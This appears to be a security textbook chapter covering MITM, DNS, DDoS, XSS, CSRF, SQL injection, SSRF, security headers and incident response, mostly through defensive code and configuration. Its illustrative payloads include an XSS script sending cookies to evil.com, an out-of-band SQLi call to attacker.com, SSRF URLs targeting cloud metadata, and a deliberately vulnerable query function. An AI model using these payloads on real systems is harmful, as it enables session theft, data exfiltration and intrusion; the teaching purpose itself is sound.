# Network Attacks and Countermeasures

> Understand the major attack techniques and defenses on networks. Learn about MITM, DNS poisoning, DDoS, session hijacking, SQL injection, and more to build a solid foundation for secure system design.

## Prerequisites

Having the following knowledge before reading this guide will deepen your understanding:

- [TLS/SSL](./00-tls-ssl.md) — Basics of TLS handshake, certificate chains, and cipher suites
- [Authentication Methods](./01-authentication.md) — How OAuth 2.0, JWT, and session management work
- [HTTP Basics](../02-http/00-http-basics.md) — HTTP requests/responses, headers, status codes
- [DNS](../00-introduction/03-dns.md) — DNS name resolution flow, record types, caching
- [TCP](../01-protocols/00-tcp.md) — TCP 3-way handshake, port numbers, connection management

---

## What You Will Learn in This Chapter

- [ ] Understand how major network attacks work
- [ ] Know the defenses against each attack
- [ ] Learn the principles of security design
- [ ] Master how to configure security headers
- [ ] Understand the basics of incident response

---

## 1. Man-in-the-Middle (MITM) Attack

```
MITM (Man-in-the-Middle):
  → Intercepts communication to eavesdrop or tamper

  Normal: Client ←──────→ Server
  MITM:   Client ←→ Attacker ←→ Server

  Attack methods:
  ① ARP Spoofing:
     → Sends fake ARP replies on a LAN to redirect traffic
     → Attack within the same LAN

     Normal: PC → Router (MAC: AA:BB:CC:DD:EE:FF)
     Attack: PC → Attacker (MAC: 11:22:33:44:55:66) → Router

     Tools: arpspoof, ettercap, bettercap

  ② Wi-Fi Sniffing:
     → Intercepts traffic on unencrypted Wi-Fi
     → Evil Twin: sets up a fake AP with the same name as the legitimate AP

     Legitimate AP: "Coffee-Shop-WiFi" (encrypted)
     Fake AP:       "Coffee-Shop-WiFi" (unencrypted)
     → User connects to fake AP → all traffic is intercepted

  ③ SSL Stripping:
     → Downgrades HTTPS connections to HTTP
     → User is unaware they are communicating over HTTP

     User ──HTTP──→ Attacker ──HTTPS──→ Server
     → Attacker terminates HTTPS and relays to user over HTTP

  ④ BGP Hijacking:
     → Manipulates BGP route advertisements to redirect traffic
     → Enables large-scale traffic interception
     → Example: 2018 Amazon Route 53 hijacking

  Defenses:
  ✓ Enforce HTTPS (TLS)
  ✓ HSTS (HTTP Strict Transport Security)
     Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
  ✓ Certificate pinning (mobile apps)
  ✓ Use VPN on public Wi-Fi
  ✓ RPKI (Resource Public Key Infrastructure) to protect BGP
```

### 1.1 Implementing ARP Spoofing Countermeasures

```bash
# Check the ARP table
$ arp -a

# Set static ARP entry (for important gateways)
$ sudo arp -s 192.168.1.1 AA:BB:CC:DD:EE:FF

# Monitor for ARP changes with arpwatch (Linux)
$ sudo apt install arpwatch
$ sudo arpwatch -i eth0

# DAI (Dynamic ARP Inspection) — Cisco switch
# Validates ARP replies in conjunction with DHCP snooping
interface GigabitEthernet0/1
  ip arp inspection trust  # Trust uplink ports

# 802.1X authentication (network access control)
# → Exclude unauthenticated devices from the network
```

```python
# ARP monitoring script (Python / Scapy)
from scapy.all import ARP, sniff
from collections import defaultdict
import logging

logging.basicConfig(level=logging.WARNING)
logger = logging.getLogger("arp_monitor")

# Mapping of IP addresses to MAC addresses
arp_table = defaultdict(set)

def detect_arp_spoof(packet):
    """Detect ARP spoofing"""
    if packet.haslayer(ARP) and packet[ARP].op == 2:  # ARP reply
        src_ip = packet[ARP].psrc
        src_mac = packet[ARP].hwsrc

        if src_ip in arp_table:
            if src_mac not in arp_table[src_ip]:
                logger.warning(
                    f"ARP Spoofing detected! "
                    f"IP {src_ip} was {arp_table[src_ip]}, "
                    f"now claims to be {src_mac}"
                )
                # Send alert, notify network administrator
                send_alert(src_ip, arp_table[src_ip], src_mac)

        arp_table[src_ip].add(src_mac)

def send_alert(ip, old_macs, new_mac):
    """Send a security alert"""
    # Notify via Slack, PagerDuty, etc.
    pass

# Start monitoring
sniff(filter="arp", prn=detect_arp_spoof, store=0)
```

---

## 2. DNS Attacks

```
① DNS Cache Poisoning:
  → Injects fake records into a resolver's cache
  → Redirects users to fake sites

  Normal: example.com → 93.184.216.34 (correct IP)
  Attack: example.com → 192.0.2.100 (attacker's IP)

  Attack method (Kaminsky Attack):
  1. Attacker queries the resolver for random subdomains
     → random12345.example.com
  2. While the resolver queries the authoritative DNS, sends a flood of fake responses
  3. If the transaction ID matches, the fake response is accepted
  4. Fake NS record is injected into the cache → takeover of all of example.com

  Defense: DNSSEC (DNS Security Extensions)
  → Adds digital signatures to DNS records
  → Enables detection of tampering

  DNSSEC validation chain:
  Root zone (.) → TLD (.com) → Domain (example.com)
  At each level: RRSIG (signature) + DNSKEY (public key) + DS (delegation signer)

② DNS Hijacking:
  → Modifies the authoritative DNS server configuration for a domain
  → Via registrar account compromise, etc.

  Examples:
  → 2018: Sea Turtle attack (nation-state-level DNS hijacking)
  → 2019: GoDaddy employee social engineering

  Defenses:
  ✓ Enable 2FA at your registrar
  ✓ Domain lock (clientTransferProhibited)
  ✓ Registry lock (high-value domains, $50–300/month)
  ✓ Monitor DNS changes (CAA, Certificate Transparency)

③ DNS Amplification Attack (a type of DDoS):
  → Spoofs the source IP to query DNS
  → Small request generates a large response directed at the victim

  Request: 64 bytes → Response: 3,000 bytes
  → ~50x amplification

  Protocols used for amplification:
  DNS:       50x
  NTP:       550x
  memcached: 50,000x
  SSDP:      30x

④ DNS Tunneling:
  → Embeds data in DNS queries to communicate
  → Bypasses firewalls

  data.encoded-payload.evil.com → returns data via TXT record
  → Abused for C2 (Command & Control) communication

  Detection:
  → Abnormally long DNS queries
  → High-frequency TXT record queries
  → Large volume of DNS queries to unknown domains
```

### 2.1 DNSSEC Configuration and Validation

```bash
# Verify DNSSEC validation
$ dig example.com +dnssec +short
93.184.216.34
A 13 2 86400 20240401120000 20240301120000 12345 example.com. <signature>

# Verify the DNSSEC chain
$ dig example.com +sigchase +trusted-key=./root.keys

# Check if DNSSEC is enabled
$ dig example.com +short +cd  # CD=Checking Disabled
$ dig example.com +short       # with DNSSEC validation
# Same result from both → normal
# Result only with +cd → DNSSEC validation failure

# Verify DNSSEC with drill (ldns-utils)
$ drill -S example.com

# DNSViz (online validation)
# https://dnsviz.net/d/example.com/dnssec/

# DNSSEC validation with unbound (local resolver)
# /etc/unbound/unbound.conf
server:
    auto-trust-anchor-file: "/var/lib/unbound/root.key"
    val-clean-additional: yes
    val-permissive-mode: no  # Return SERVFAIL on validation failure
```

---

## 3. DDoS Attacks

```
DDoS (Distributed Denial of Service):
  → Takes down a service with massive traffic

  Evolution of attack scale:
  2010s: Tens of Gbps
  2020s: Several Tbps (terabit-scale)
  2023: Cloudflare recorded an HTTP DDoS of 201 million RPS

  Attack classification:
  ┌──────────────┬──────────────────────────────────┐
  │ Layer        │ Attack method                     │
  ├──────────────┼──────────────────────────────────┤
  │ L3/L4        │ SYN flood: massive SYN packets    │
  │ (Network)    │ UDP flood: massive UDP packets    │
  │              │ Amplification: DNS/NTP/memcached  │
  │              │ ICMP flood: ping of death         │
  │              │ Fragmentation: fragmented packets │
  ├──────────────┼──────────────────────────────────┤
  │ L7           │ HTTP flood: massive HTTP requests │
  │ (App)        │ Slowloris: holds connections open │
  │              │ RUDY: sends POST body very slowly │
  │              │ API abuse: expensive API calls    │
  │              │ ReDoS: regex computation explosion│
  └──────────────┴──────────────────────────────────┘
```

### 3.1 Details and Defenses for Each Attack

```
SYN Flood:
  → Exploits the TCP 3-way handshake
  → Sends massive SYN packets without returning ACK
  → Exhausts the server's SYN queue

  Attacker ── SYN ──→ Server (waits in SYN_RECEIVED state)
  Attacker ── SYN ──→ Server (waits in SYN_RECEIVED state)
  ... thousands to millions of SYNs

  Defenses:
  ① SYN Cookie:
     → Server does not maintain SYN_RECEIVED state
     → Includes encrypted info as the sequence number in SYN-ACK
     → Recovers session info from the client's ACK

  ② SYN Proxy:
     → Load balancer or firewall performs the 3-way handshake on behalf
     → Forwards to the backend only after a successful handshake

  ③ Kernel parameter tuning (Linux):
     net.ipv4.tcp_syncookies = 1
     net.ipv4.tcp_max_syn_backlog = 65535
     net.ipv4.tcp_synack_retries = 2
     net.core.somaxconn = 65535

Slowloris:
  → Sends HTTP request headers extremely slowly
  → Exhausts the server's connection count
  → Effective with few resources

  Attack:
  GET / HTTP/1.1\r\n
  Host: target.com\r\n
  X-a: 1\r\n          ← keeps adding headers at intervals of seconds
  X-b: 2\r\n          ← request never completes
  ...                  ← holds the connection until timeout

  Defenses:
  ✓ Set timeout for request headers
    Nginx: client_header_timeout 10s;
    Apache: RequestReadTimeout header=10-20,MinRate=500
  ✓ Limit connections per IP
  ✓ Use reverse proxy (Nginx is resistant to Slowloris)

HTTP Flood (L7 DDoS):
  → Sends a massive number of normal HTTP requests
  → Distributed from a botnet
  → Difficult to distinguish from legitimate traffic

  Defenses:
  ✓ WAF (Web Application Firewall)
  ✓ Rate limiting (IP/user-based)
  ✓ CAPTCHA challenges
  ✓ JavaScript challenges (bot detection)
  ✓ Behavioral analysis (anomaly detection)
```

### 3.2 Multi-Layer DDoS Defense Approach

```
Overview of DDoS defense:

  ┌─────────────────────────────────────────┐
  │ CDN / DDoS Protection (Cloudflare, etc.)│ ← L3/L4/L7
  │   → Distributed reception via Anycast   │
  │   → Absorbs malicious traffic           │
  ├─────────────────────────────────────────┤
  │ WAF (Web Application Firewall)          │ ← L7
  │   → Filters SQLi, XSS, bots, etc.      │
  │   → IP reputation                      │
  ├─────────────────────────────────────────┤
  │ Load Balancer                           │ ← L4/L7
  │   → Health checks, auto-scale support   │
  ├─────────────────────────────────────────┤
  │ Rate Limiting                           │ ← L7
  │   → Nginx / API Gateway                │
  │   → Per IP, user, API key              │
  ├─────────────────────────────────────────┤
  │ Application                             │
  │   → Input validation, caching          │
  │   → Circuit breaker                    │
  └─────────────────────────────────────────┘
```

```nginx
# Nginx rate limiting configuration
http {
    # Define rate limiting zones
    limit_req_zone $binary_remote_addr zone=api:10m rate=10r/s;
    limit_req_zone $binary_remote_addr zone=login:10m rate=1r/s;

    # Connection count limiting
    limit_conn_zone $binary_remote_addr zone=addr:10m;

    server {
        # API endpoint: 10 requests/sec, burst 20
        location /api/ {
            limit_req zone=api burst=20 nodelay;
            limit_req_status 429;

            # Connection count limiting
            limit_conn addr 100;

            proxy_pass http://backend;
        }

        # Login endpoint: 1 request/sec, burst 5
        location /api/auth/login {
            limit_req zone=login burst=5 nodelay;
            limit_req_status 429;
            proxy_pass http://backend;
        }

        # Customize 429 response
        error_page 429 = @rate_limited;
        location @rate_limited {
            default_type application/json;
            return 429 '{"error":"Too Many Requests","retry_after":60}';
        }
    }
}
```

```python
# Rate limiting implementation in Python / FastAPI
from fastapi import FastAPI, Request, HTTPException
from datetime import datetime, timedelta
import asyncio

app = FastAPI()

# Sliding window counter (Redis recommended)
class RateLimiter:
    def __init__(self, max_requests: int, window_seconds: int):
        self.max_requests = max_requests
        self.window_seconds = window_seconds
        self.requests: dict[str, list[float]] = {}
        self._lock = asyncio.Lock()

    async def is_allowed(self, key: str) -> tuple[bool, dict]:
        async with self._lock:
            now = datetime.now().timestamp()
            window_start = now - self.window_seconds

            # Remove requests outside the window
            if key in self.requests:
                self.requests[key] = [
                    t for t in self.requests[key] if t > window_start
                ]
            else:
                self.requests[key] = []

            current_count = len(self.requests[key])
            remaining = self.max_requests - current_count

            headers = {
                "X-RateLimit-Limit": str(self.max_requests),
                "X-RateLimit-Remaining": str(max(0, remaining - 1)),
                "X-RateLimit-Reset": str(int(window_start + self.window_seconds)),
            }

            if current_count >= self.max_requests:
                headers["Retry-After"] = str(self.window_seconds)
                return False, headers

            self.requests[key].append(now)
            return True, headers

# API: 100 requests/minute
api_limiter = RateLimiter(max_requests=100, window_seconds=60)

# Login: 5 requests/minute
login_limiter = RateLimiter(max_requests=5, window_seconds=60)

@app.middleware("http")
async def rate_limit_middleware(request: Request, call_next):
    client_ip = request.client.host
    path = request.url.path

    if path.startswith("/api/auth/login"):
        limiter = login_limiter
    elif path.startswith("/api/"):
        limiter = api_limiter
    else:
        return await call_next(request)

    allowed, headers = await limiter.is_allowed(client_ip)

    if not allowed:
        raise HTTPException(
            status_code=429,
            detail="Too Many Requests",
            headers=headers,
        )

    response = await call_next(request)
    for key, value in headers.items():
        response.headers[key] = value
    return response
```

---

## 4. Web Application Attacks

### 4.1 XSS (Cross-Site Scripting)

```
XSS (Cross-Site Scripting):
  → Injects malicious scripts into web pages

  Types:
  ① Stored XSS:
     → Saved in the DB (e.g., comment fields)
     → Affects all users
     → Most dangerous

     Attack: Post in comment field:
     <script>fetch('https://evil.com/steal?c='+document.cookie)</script>

     → Other users view the page → cookies are stolen

  ② Reflected XSS:
     → Via URL parameters
     → Victim is lured via phishing email link

     Attack URL:
     https://example.com/search?q=<script>alert(document.cookie)</script>

  ③ DOM-based XSS:
     → Occurs in client-side JS processing
     → Does not go through the server

     Vulnerable code:
     document.getElementById('output').innerHTML = location.hash.substring(1);

     Attack: https://example.com/#<img src=x onerror=alert(1)>

  Defense details:

  ① Output escaping:
     HTML: < → &lt;  > → &gt;  & → &amp;  " → &quot;
     JavaScript: Unicode escaping
     URL: Percent-encoding
     CSS: Backslash escaping

  ② Content-Security-Policy:
     Content-Security-Policy:
       default-src 'self';
       script-src 'self' 'nonce-abc123';
       style-src 'self' 'unsafe-inline';
       img-src 'self' data: https:;
       font-src 'self' https://fonts.gstatic.com;
       connect-src 'self' https://api.example.com;
       frame-ancestors 'none';
       base-uri 'self';
       form-action 'self';

     Nonce-based:
     <script nonce="abc123">/* permitted script */</script>

  ③ HttpOnly Cookie:
     Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Strict
     → Cannot be accessed from JavaScript via document.cookie

  ④ Trusted Types (implemented in Chrome):
     Content-Security-Policy: require-trusted-types-for 'script'
     → Prohibits direct use of dangerous APIs such as innerHTML
```

```typescript
// XSS countermeasure implementation (TypeScript)

// HTML escaping
function escapeHtml(unsafe: string): string {
  return unsafe
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

// Sanitization with DOMPurify (library recommended)
import DOMPurify from 'dompurify';

// Safe insertion of rich text
function safeInsertHtml(element: HTMLElement, html: string): void {
  const clean = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
    ALLOWED_ATTR: ['href', 'title'],
    ALLOW_DATA_ATTR: false,
  });
  element.innerHTML = clean;
}

// CSP nonce generation (server-side)
import crypto from 'crypto';

function generateCspNonce(): string {
  return crypto.randomBytes(16).toString('base64');
}

// Setting CSP in Express middleware
function cspMiddleware(req: any, res: any, next: any) {
  const nonce = generateCspNonce();
  res.locals.cspNonce = nonce;

  res.setHeader('Content-Security-Policy', [
    `default-src 'self'`,
    `script-src 'self' 'nonce-${nonce}'`,
    `style-src 'self' 'nonce-${nonce}'`,
    `img-src 'self' data: https:`,
    `connect-src 'self' https://api.example.com`,
    `frame-ancestors 'none'`,
    `base-uri 'self'`,
    `form-action 'self'`,
  ].join('; '));

  next();
}
```

### 4.2 CSRF (Cross-Site Request Forgery)

```
CSRF (Cross-Site Request Forgery):
  → Exploits a user's authenticated state to perform unintended actions

  Attack scenario:
  1. User is logged into a banking site
  2. User visits attacker's trap site
  3. The trap site automatically sends a request to the bank API
  4. User's cookie is sent automatically → transfer is executed

  Attack code (trap site):
  <form action="https://bank.example.com/transfer" method="POST">
    <input type="hidden" name="to" value="attacker" />
    <input type="hidden" name="amount" value="1000000" />
  </form>
  <script>document.forms[0].submit();</script>

  Defenses:

  ① CSRF Token (Synchronizer Token Pattern):
     → Embeds a unique token in the form
     → Server verifies the token on each request

     <form action="/transfer" method="POST">
       <input type="hidden" name="_csrf" value="random-token-abc" />
       ...
     </form>

  ② Double Submit Cookie:
     → Includes the CSRF token in both the cookie and request body
     → Server verifies that both match
     → Can be implemented statelessly

  ③ SameSite Cookie:
     Set-Cookie: session=abc; SameSite=Lax

     SameSite=Strict: Does not send cookie on cross-site requests
     SameSite=Lax:    Sends only on top-level navigation (GET links)
     SameSite=None:   Sends (requires Secure attribute)

  ④ Validate Origin / Referer headers:
     → Verify the request origin domain
     → Reject requests from domains other than your own

  ⑤ Require custom headers:
     → X-Requested-With: XMLHttpRequest
     → Requires a CORS preflight, preventing cross-site submission
```

```python
# CSRF countermeasure implementation (Python / FastAPI)
from fastapi import FastAPI, Request, Form, HTTPException
from fastapi.responses import HTMLResponse
import secrets
import hmac

app = FastAPI()

# CSRF token generation and verification
class CSRFProtection:
    def __init__(self, secret_key: str):
        self.secret_key = secret_key

    def generate_token(self, session_id: str) -> str:
        """Generate a CSRF token tied to the session"""
        random_part = secrets.token_hex(16)
        signature = hmac.new(
            self.secret_key.encode(),
            f"{session_id}:{random_part}".encode(),
            "sha256"
        ).hexdigest()
        return f"{random_part}:{signature}"

    def verify_token(self, session_id: str, token: str) -> bool:
        """Verify a CSRF token"""
        try:
            random_part, signature = token.split(":")
            expected = hmac.new(
                self.secret_key.encode(),
                f"{session_id}:{random_part}".encode(),
                "sha256"
            ).hexdigest()
            return hmac.compare_digest(signature, expected)
        except (ValueError, AttributeError):
            return False

csrf = CSRFProtection(secret_key="your-secret-key")

@app.get("/form", response_class=HTMLResponse)
async def get_form(request: Request):
    session_id = request.cookies.get("session_id", "")
    token = csrf.generate_token(session_id)
    return f"""
    <form method="POST" action="/submit">
        <input type="hidden" name="_csrf" value="{token}" />
        <input type="text" name="data" />
        <button type="submit">Submit</button>
    </form>
    """

@app.post("/submit")
async def submit_form(
    request: Request,
    _csrf: str = Form(...),
    data: str = Form(...)
):
    session_id = request.cookies.get("session_id", "")
    if not csrf.verify_token(session_id, _csrf):
        raise HTTPException(status_code=403, detail="CSRF token invalid")
    return {"message": "Success", "data": data}
```

### 4.3 SQL Injection

```
SQL Injection:
  → Injects malicious input into SQL statements

  Attack example:
  Input: ' OR 1=1 --
  SQL: SELECT * FROM users WHERE name = '' OR 1=1 --'
  → Returns all users' data

  Advanced attacks:
  ① UNION-based:
     Input: ' UNION SELECT username, password FROM users --
     → Retrieves data from another table

  ② Blind SQLi (boolean-based):
     Input: ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE id=1)='a' --
     → Identifies the password one character at a time

  ③ Time-based Blind:
     Input: ' AND IF(1=1, SLEEP(5), 0) --
     → Infers information from response time differences

  ④ Out-of-band:
     Input: '; EXEC xp_dirtree '//attacker.com/share' --
     → Triggers outbound communication from server to attacker to exfiltrate data

  Defenses:
  ✓ Parameterized queries (Prepared Statements)
  ✓ Use an ORM
  ✓ Input validation (whitelist)
  ✗ Do not build SQL by string concatenation
  ✗ Blacklist-based filtering is insufficient
```

```python
# SQL injection countermeasures (Python)

# Vulnerable code (absolutely do NOT do this)
def get_user_vulnerable(username: str):
    query = f"SELECT * FROM users WHERE username = '{username}'"
    cursor.execute(query)  # SQL injection possible!

# Safe code (Prepared Statement)
def get_user_safe(username: str):
    query = "SELECT * FROM users WHERE username = %s"
    cursor.execute(query, (username,))  # Parameterized

# SQLAlchemy ORM (recommended)
from sqlalchemy import select
from sqlalchemy.orm import Session

def get_user_orm(session: Session, username: str):
    stmt = select(User).where(User.username == username)
    return session.execute(stmt).scalar_one_or_none()

# When dynamic queries are needed (e.g., sorting)
ALLOWED_SORT_COLUMNS = {"name", "created_at", "email"}
ALLOWED_SORT_ORDERS = {"asc", "desc"}

def get_users_sorted(sort_by: str, order: str):
    # Whitelist validation
    if sort_by not in ALLOWED_SORT_COLUMNS:
        raise ValueError(f"Invalid sort column: {sort_by}")
    if order not in ALLOWED_SORT_ORDERS:
        raise ValueError(f"Invalid sort order: {order}")

    # Use only validated values
    query = f"SELECT * FROM users ORDER BY {sort_by} {order}"
    cursor.execute(query)
```

### 4.4 SSRF (Server-Side Request Forgery)

```
SSRF (Server-Side Request Forgery):
  → Makes the server send requests to internal resources

  Attack examples:
  GET /api/fetch?url=http://169.254.169.254/latest/meta-data/
  → Steals IAM credentials from AWS metadata

  GET /api/fetch?url=http://localhost:6379/
  → Directly accesses internal Redis

  GET /api/fetch?url=http://10.0.0.1/admin/
  → Accesses internal network admin panel

  Bypass techniques:
  → Alternatives to 127.0.0.1: 0x7f000001, 2130706433, 0177.0.0.1
  → Alternatives to localhost: 127.0.0.1, [::1], 0.0.0.0
  → DNS rebinding: first resolves to public IP, then changes to internal IP
  → URL parsing differences: http://evil.com\@internal/

  Defenses:
  ✓ Whitelist URL validation
  ✓ Block requests to internal IP addresses
  ✓ Use IMDSv2 (AWS) — token-based metadata access
  ✓ Validate IP address after DNS resolution
  ✓ Network-level restrictions (firewall)
  ✓ Use libraries such as ssrf-filter
```

```python
# SSRF countermeasure implementation (Python)
import ipaddress
import socket
from urllib.parse import urlparse

BLOCKED_IP_RANGES = [
    ipaddress.ip_network('10.0.0.0/8'),       # Private
    ipaddress.ip_network('172.16.0.0/12'),     # Private
    ipaddress.ip_network('192.168.0.0/16'),    # Private
    ipaddress.ip_network('127.0.0.0/8'),       # Loopback
    ipaddress.ip_network('169.254.0.0/16'),    # Link-local (metadata)
    ipaddress.ip_network('0.0.0.0/8'),         # This network
    ipaddress.ip_network('::1/128'),           # IPv6 loopback
    ipaddress.ip_network('fc00::/7'),          # IPv6 private
    ipaddress.ip_network('fe80::/10'),         # IPv6 link-local
]

ALLOWED_SCHEMES = {'http', 'https'}
ALLOWED_PORTS = {80, 443, 8080, 8443}

def validate_url(url: str) -> bool:
    """URL validation to prevent SSRF"""
    try:
        parsed = urlparse(url)

        # Scheme validation
        if parsed.scheme not in ALLOWED_SCHEMES:
            return False

        # Port validation
        port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        if port not in ALLOWED_PORTS:
            return False

        # Hostname resolution
        hostname = parsed.hostname
        if not hostname:
            return False

        # Resolve DNS to get IP address
        resolved_ips = socket.getaddrinfo(hostname, port)
        for family, socktype, proto, canonname, sockaddr in resolved_ips:
            ip = ipaddress.ip_address(sockaddr[0])

            # Check against blocked IP ranges
            for blocked_range in BLOCKED_IP_RANGES:
                if ip in blocked_range:
                    return False

        return True

    except (ValueError, socket.gaierror):
        return False

# Usage example
@app.get("/api/fetch")
async def fetch_url(url: str):
    if not validate_url(url):
        raise HTTPException(
            status_code=400,
            detail="URL not allowed"
        )
    # Fetch only safe URLs
    async with httpx.AsyncClient() as client:
        response = await client.get(url, follow_redirects=False)
    return response.json()
```

---

## 5. Security Headers

```
Recommended HTTP security headers:

① Content-Security-Policy (CSP):
  → The most important header for XSS defense
  Content-Security-Policy:
    default-src 'self';
    script-src 'self' 'nonce-abc123';
    style-src 'self' https://fonts.googleapis.com;
    img-src 'self' data: https:;
    font-src 'self' https://fonts.gstatic.com;
    connect-src 'self' https://api.example.com;
    media-src 'none';
    object-src 'none';
    frame-ancestors 'none';
    base-uri 'self';
    form-action 'self';
    upgrade-insecure-requests;

  CSP reporting:
  Content-Security-Policy-Report-Only: ...
  report-uri /api/csp-report;
  → Sends a report on violation (does not block)
  → Useful for gradual adoption

② X-Frame-Options:
  → Clickjacking defense
  X-Frame-Options: DENY
  → Recommended to use together with frame-ancestors 'none' (CSP)

③ X-Content-Type-Options:
  → MIME type sniffing defense
  X-Content-Type-Options: nosniff
  → Browser does not guess Content-Type

④ Strict-Transport-Security:
  → Enforces HTTPS
  Strict-Transport-Security: max-age=63072000; includeSubDomains; preload

⑤ Referrer-Policy:
  → Restricts Referer information
  Referrer-Policy: strict-origin-when-cross-origin
  → Same origin: full URL, cross-origin: origin only

⑥ Permissions-Policy (formerly Feature-Policy):
  → Restricts browser features
  Permissions-Policy:
    camera=(),
    microphone=(),
    geolocation=(),
    payment=(),
    usb=(),
    magnetometer=(),
    gyroscope=(),
    accelerometer=()

⑦ Cross-Origin-Opener-Policy (COOP):
  Cross-Origin-Opener-Policy: same-origin
  → Defense against Spectre attacks

⑧ Cross-Origin-Embedder-Policy (COEP):
  Cross-Origin-Embedder-Policy: require-corp
  → Required to use SharedArrayBuffer, etc.

⑨ Cross-Origin-Resource-Policy (CORP):
  Cross-Origin-Resource-Policy: same-site
  → Restricts cross-origin embedding of resources
```

```nginx
# Nginx security header configuration
server {
    # CSP
    add_header Content-Security-Policy
      "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self'; connect-src 'self'; frame-ancestors 'none'; base-uri 'self'; form-action 'self'" always;

    # Clickjacking
    add_header X-Frame-Options "DENY" always;

    # MIME sniffing
    add_header X-Content-Type-Options "nosniff" always;

    # HSTS
    add_header Strict-Transport-Security
      "max-age=63072000; includeSubDomains; preload" always;

    # Referrer
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;

    # Feature restrictions
    add_header Permissions-Policy
      "camera=(), microphone=(), geolocation=(), payment=()" always;

    # COOP / COEP
    add_header Cross-Origin-Opener-Policy "same-origin" always;
    add_header Cross-Origin-Resource-Policy "same-site" always;

    # Remove unnecessary headers like X-Powered-By
    proxy_hide_header X-Powered-By;
    server_tokens off;
}
```

```
Verification tools:
  → https://securityheaders.com/
  → https://observatory.mozilla.org/
  → Chrome DevTools → Network → Response Headers
  → curl -I https://example.com
```

---

## 6. Principles of Security Design

```
① Defense in Depth:
  → If one layer is breached, the next layer stops the attacker
  → WAF → Firewall → App → DB

  Example (SQL injection defense):
  Layer 1: WAF filters SQL injection patterns
  Layer 2: App validates input
  Layer 3: Parameterized queries
  Layer 4: Minimize DB user privileges (SELECT ONLY, etc.)
  → Even if one layer is breached, the next layer defends

② Principle of Least Privilege:
  → Grant only the minimum necessary privileges
  → IAM policies, DB user privileges

  Examples:
  → API server DB user: SELECT, INSERT, UPDATE only (no DELETE)
  → Lambda function: access only the necessary S3 buckets
  → Kubernetes Pod: mount only the necessary Secrets

③ Zero Trust:
  → Do not assume "internal network = safe"
  → Always require authentication and authorization
  → "Never trust, always verify"

  Traditional: Internal network = trusted → once inside via VPN, access everything
  Zero Trust: Verify every request → mTLS + JWT + policy engine

  Implementation elements:
  → Identity provider (IdP)
  → Device authentication and assessment
  → Microsegmentation
  → Continuous verification (even during sessions)

④ Fail Secure:
  → Fall back to a safe state on error
  → Authentication error → deny access (not grant)
  → Configuration error → deny by default

⑤ Input Validation:
  → Do not trust any external input
  → Validation: check format and range
  → Sanitization: remove/escape dangerous characters
  → Normalization: Unicode normalization, path traversal defense

⑥ Security Visibility:
  → Log all access
  → Anomaly detection (SIEM)
  → Alert notifications
  → Regular audits
```

---

## 7. CORS (Cross-Origin Resource Sharing)

```
CORS:
  → Controls resource sharing between different origins
  → Relaxes the browser's security feature (Same-Origin Policy)

Same-Origin Policy:
  → Allows requests only to the same origin (scheme + host + port)
  → https://app.example.com → https://api.example.com are different origins

CORS flow:

① Simple Request (no preflight):
  → GET, HEAD, POST (some Content-Types)
  → No custom headers

  Browser → API server:
    GET /api/data
    Origin: https://app.example.com

  API server → Browser:
    Access-Control-Allow-Origin: https://app.example.com
    → Browser compares Origin with Allow-Origin

② Preflight Request:
  → PUT, DELETE, custom headers, etc.
  → Pre-check with an OPTIONS request

  Browser → API server:
    OPTIONS /api/data
    Origin: https://app.example.com
    Access-Control-Request-Method: PUT
    Access-Control-Request-Headers: Authorization, Content-Type

  API server → Browser:
    Access-Control-Allow-Origin: https://app.example.com
    Access-Control-Allow-Methods: GET, POST, PUT, DELETE
    Access-Control-Allow-Headers: Authorization, Content-Type
    Access-Control-Max-Age: 86400  ← preflight cache

CORS security notes:
  ✗ Access-Control-Allow-Origin: * + credentials
     → Cannot send cookies/auth headers
  ✓ Explicitly specify allowed origins
  ✗ Do not reflect the request's Origin header directly
     → Would allow any origin
```

```python
# CORS configuration (Python / FastAPI)
from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware

app = FastAPI()

# List of allowed origins
ALLOWED_ORIGINS = [
    "https://app.example.com",
    "https://admin.example.com",
]

# Add only for development environment
import os
if os.getenv("ENV") == "development":
    ALLOWED_ORIGINS.append("http://localhost:3000")

app.add_middleware(
    CORSMiddleware,
    allow_origins=ALLOWED_ORIGINS,       # Allowed origins
    allow_credentials=True,              # Allow sending cookies/auth headers
    allow_methods=["GET", "POST", "PUT", "DELETE"],  # Allowed HTTP methods
    allow_headers=["Authorization", "Content-Type"],   # Allowed headers
    expose_headers=["X-Request-Id"],     # Response headers exposed to client
    max_age=86400,                       # Preflight cache (seconds)
)
```

---

## 8. Supply Chain Attacks

```
Supply chain attacks:
  → Attacks via dependent libraries or development tools

  Examples:
  ① event-stream (2018):
     → Malware injected into an npm package
     → Targeted at stealing cryptocurrency wallets

  ② SolarWinds (2020):
     → Backdoor inserted into the build system
     → Distributed to 18,000 organizations via updates

  ③ ua-parser-js (2021):
     → Account takeover of a popular npm package
     → Published a version containing a crypto miner and password stealer

  ④ Log4Shell (2021):
     → Vulnerability in Log4j (CVE-2021-44228)
     → RCE via JNDI Injection

  Defenses:
  ✓ Audit dependency packages
     npm audit / yarn audit / pip-audit
  ✓ Use lock files (package-lock.json, Pipfile.lock)
  ✓ Pin dependency versions (^ → =)
  ✓ Automatic updates with Dependabot / Renovate
  ✓ SCA (Software Composition Analysis) tools
     Snyk, Trivy, Grype
  ✓ Generate and manage SBOMs
  ✓ Verify signatures (Sigstore, npm provenance)
  ✓ Use private registries
```

---

## 9. Incident Response

```
Incident response flow:

  ① Detection:
     → Monitoring alerts, log analysis, user reports
     → SIEM (Security Information and Event Management)
     → Detection of abnormal traffic patterns

  ② Triage:
     → Identify scope of impact
     → Classify severity (P1–P4)
     → Assemble response team

  ③ Containment:
     → Prevent spread of damage
     → Disable compromised accounts
     → Isolate affected services
     → Disconnect network segments

  ④ Root Cause Analysis:
     → Detailed log investigation
     → Identify attack vector
     → Reconstruct timeline

  ⑤ Recovery:
     → Apply patches
     → Rotate passwords/keys
     → Gradual service restoration
     → Strengthen monitoring

